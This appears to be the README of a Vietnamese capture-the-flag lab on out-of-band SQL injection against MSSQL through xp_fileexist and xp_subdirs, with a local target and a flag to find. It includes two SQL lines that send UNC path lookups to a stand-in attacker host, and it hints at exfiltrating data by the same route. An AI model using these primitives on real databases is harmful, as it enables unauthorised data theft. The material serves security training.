# SQLi-037: MSSQL OOB DNS via xp_fileexist/xp_subdirs

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên MSSQL bằng `xp_fileexist` và `xp_subdirs` thay vì `xp_dirtree`.

## 📝 Mô Tả

**Scenario:** Trong một số môi trường, `xp_dirtree` bị disable nhưng `xp_fileexist` và `xp_subdirs` vẫn hoạt động.

**URL:** `http://localhost:5037/report?id=1`

**Đặc điểm:**
- `xp_dirtree` bị blocked bởi security policy
- `xp_fileexist` và `xp_subdirs` vẫn enabled
- Stacked queries được hỗ trợ

## 🎓 Kiến Thức Cần Thiết

### xp_fileexist

Kiểm tra sự tồn tại của file, cũng trigger DNS khi dùng UNC path:

```sql
EXEC master..xp_fileexist '\\attacker.com\share\file'
```

### xp_subdirs

Liệt kê subdirectories, tương tự xp_dirtree:

```sql
EXEC master..xp_subdirs '\\attacker.com\share'
```

## 🚀 Run Lab

```bash
docker-compose up -d
curl http://localhost:5037/report?id=1
docker-compose down
```

## 💡 Hints

1. Thử nhiều extended stored procedures khác nhau
2. xp_fileexist trả về bảng kết quả (1 = exists, 0 = not exists)
3. Data exfiltration syntax tương tự xp_dirtree

## 🏁 Flag Format

```
FLAG{...}
```
